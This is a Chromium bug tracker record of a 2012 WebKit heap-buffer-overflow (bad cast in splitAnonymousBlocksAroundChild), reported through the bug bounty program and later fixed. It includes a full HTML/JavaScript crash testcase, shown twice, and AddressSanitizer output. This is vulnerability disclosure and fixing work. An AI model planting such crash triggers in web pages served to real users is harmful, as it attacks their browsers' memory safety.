# Bad cast in splitAnonymousBlocksAroundChild (part 3)

| Field | Value |
|-------|-------|
| **Issue ID** | [40053907](https://issues.chromium.org/issues/40053907) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-20 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

like 114924 but reproing on 108225

**VERSION**  

Chrome Version:

Chromium 19.0.1048.0 (Developer Build 122755)  

OS Linux  

WebKit 535.22 (@108225)  

JavaScript V8 3.9.7

Operating System: linux 64 bit

**REPRODUCTION CASE**

<html>
<head>
<style>
#el1 { -webkit-column-count: 2; }
#el2 { -webkit-column-span: all; }
#el3 {
content: counter(c);
}
</style>
<script>
onload = function() {
el1 = document.createElement('div')
el1.setAttribute('id', 'el1')
document.body.appendChild(el1)
el2 = document.createElement('div')
el2.setAttribute('id', 'el2')
el1.appendChild(el2)
el3 = document.createElement('div')
el3.setAttribute('id', 'el3')
el1.appendChild(el3)
el4 = document.createElement('div')
el1.appendChild(el4)
el1.style.display='table-caption'
el2.style.display='run-in'
el4.style.display='table-row-group'
document.body.offsetTop
document.body.style.zoom=2
document.body.offsetTop
el2.style.display='inline'
document.body.offsetTop
el2.style.display='table'
el4.style.display='inline'
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab of asan  

Crash State:

==20481== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffecc9f3c0 at pc 0x520cda4 bp 0x7fffffff8b20 sp 0x7fffffff8b18  

READ of size 1 at 0x7fffecc9f3c0 thread T0  

#0 0x520cda4 in WebCore::RenderTableSection::willBeDestroyed() ???:0  

#1 0x51b85a2 in WebCore::RenderObject::destroy() ???:0

0x7fffecc9f3c0 is located 136 bytes to the right of 184-byte region [0x7fffecc9f280,0x7fffecc9f338)  

allocated by thread T0 here:  

#0 0x7e14082 in malloc ??:0  

#1 0x4fa6116 in WebCore::RenderBlock::createAnonymousBlock(bool) const ???:0  

#2 0x4fa5035 in WebCore::RenderBlock::splitAnonymousBlocksAroundChild(WebCore::RenderObject\*) ???:0  

#3 0x4fa451e in WebCore::RenderBlock::addChildToAnonymousColumnBlocks(WebCore::RenderObject\*, WebCore::RenderObject\*) ???:0

## Attachments

- [beta-136184p.txt](attachments/beta-136184p.txt) (text/x-c; charset=us-ascii, 7.1 KB)
- [stable-136184p.txt](attachments/stable-136184p.txt) (text/plain; charset=us-ascii, 7.2 KB)
- [136184p.txt](attachments/136184p.txt) (text/x-c; charset=us-ascii, 7.2 KB)
- [136184p.html](attachments/136184p.html) (text/html; charset=us-ascii, 1.0 KB)

## Timeline

### sc...@gmail.com (2012-02-22)

https://cluster-fuzz.appspot.com/testcase?key=21864066

Claims it's a duplicate of https://cluster-fuzz.appspot.com/testcase?key=19719061, which I couldn't find referenced in any bug?
@inferno: any thoughts on how I should interpret that?

Anyway looks like a possible bad cast to me.

Still waiting for SecImpacts

### sc...@gmail.com (2012-02-22)

CF "update bug" button is failing. Adding impacts tags manually.


### in...@chromium.org (2012-02-22)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=21864066

Uploader: cevans@google.com

Crash Type: Heap-buffer-overflow READ 1
Crash Address: 0x7f13d5109fc0
Crash State:
  - crash stack -
  WebCore::RenderTableSection::willBeDestroyed
  WebCore::RenderObject::destroy
  WebCore::Node::detach
  

Minimized Testcase (0.88 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv95e0zHKTSZUgEg4P4G1LOGz35agsrBpw6DMB-ec1mCcMXKVs8Mo3v3qGHwSOKNhdfe0Wy1KQDRkQoJkgLaOiRfyDyaDt3RrC84NR89yqqx_-yJSZtFd3A6NK850rtxqBVBfK5qwrJwo-88bYNqB5fiqpGi8dw
<style>
      #el1 { -webkit-column-count: 2; }
      #el2 { -webkit-column-span: all; }
      #el3 {
        content: counter(c);
</style>
    <script>
      onload = function() {
        el1 = document.createElement('div')
        el1.setAttribute('id', 'el1')
        document.body.appendChild(el1)
        el2 = document.createElement('div')
        el2.setAttribute('id', 'el2')
        el1.appendChild(el2)
        el3 = document.createElement('div')
        el3.setAttribute('id', 'el3')
        el1.appendChild(el3)
        el4 = document.createElement('div')
        el1.appendChild(el4)
        el4.style.display='table-row-group'
        document.body.offsetTop
        document.body.style.zoom=2
        document.body.offsetTop
        el2.style.display='inline'
        document.body.offsetTop
        el2.style.display='table'
        el4.style.display='inline'
      }
    </script>

### in...@chromium.org (2012-02-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-23)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-28)

upstreamed - https://bugs.webkit.org/show_bug.cgi?id=79755

### in...@chromium.org (2012-02-28)

This is not same as other splitAnonymousBlocksAroundChild bugs. It shows a fundamental problem with adding child to anonymous column blocks.

### in...@chromium.org (2012-02-28)

http://trac.webkit.org/changeset/109140

### sc...@gmail.com (2012-03-01)

M17: http://trac.webkit.org/changeset/109436
M18: http://trac.webkit.org/changeset/109437

### sc...@gmail.com (2012-03-01)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-03)

$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-03-03)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/115028?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053907)*
